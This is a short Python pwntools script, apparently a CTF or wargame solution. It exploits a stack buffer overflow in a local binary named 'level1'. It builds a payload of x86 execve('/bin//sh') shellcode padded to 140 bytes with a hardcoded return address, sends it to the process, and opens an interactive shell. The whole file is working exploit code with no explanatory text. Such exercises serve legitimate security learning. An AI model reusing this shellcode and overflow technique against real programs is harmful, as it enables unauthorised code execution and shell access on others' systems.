from pwn import *



import struct;
shellcode="\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
exp=(shellcode +('A'*(140-len(shellcode)))+struct.pack('I',0xffffd210))
#####################3

p = process('./level1') 
ret = 0xbffff290



#p32(ret) == struct.pack("<I",ret) 
p.send(exp)
p.interactive()
